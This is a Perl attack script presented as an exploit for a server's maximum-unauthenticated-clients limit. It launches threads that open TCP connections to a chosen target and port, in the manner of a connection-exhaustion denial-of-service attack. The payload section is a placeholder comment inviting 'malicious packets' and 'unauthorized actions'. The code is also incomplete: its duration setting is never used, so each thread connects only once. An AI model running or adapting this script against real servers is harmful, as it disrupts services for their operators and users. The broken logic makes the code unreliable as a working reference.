#!/usr/bin/perl

#######################################################
# MAX_UNAUTH_CLIENTS Exploit Script
# Forked from Vulners.com, improved by m-kis
#######################################################

use strict;
use warnings;
use IO::Socket::INET;
use Getopt::Long;
use threads;

my $target;
my $port;
my $duration;
my $threads_count = 10;  # Valeur par défaut

GetOptions(
    'target=s'        => \$target,
    'port=i'          => \$port,
    'duration=i'      => \$duration,
    'threads_count=i' => \$threads_count,  # Nouvel argument threads_count
);

usage() unless defined $target && defined $port && defined $duration;

sub usage {
    print "Usage: $0 --target <target_domain> --port <target_port> --duration <attack_duration> [--threads_count <threads_count>]\n";
    exit;
}

sub exploit {
    my ($target, $port) = @_;

    my $socket = IO::Socket::INET->new(
        PeerAddr => $target,
        PeerPort => $port,
        Proto    => 'tcp',
    );

    unless ($socket) {
        print "Failed to connect to $target:$port - $!\n";
        return;
    }

    # Personnalisez la charge utile et les actions ici
    # Exemple : Envoyez des paquets malveillants, effectuez des actions non autorisées, etc.

    close($socket);
}

sub run_attack {
    my ($target, $port, $duration) = @_;

    my $end_time = time + $duration;

    print "Starting attack on $target:$port for $duration seconds with $threads_count threads...\n";

    my @threads;
    for (1..$threads_count) {
        push @threads, threads->create(\&exploit, $target, $port);
    }

    # Attendez que tous les threads se terminent
    foreach my $thread (@threads) {
        $thread->join();
    }

    print "Attack completed.\n";
}

run_attack($target, $port, $duration);
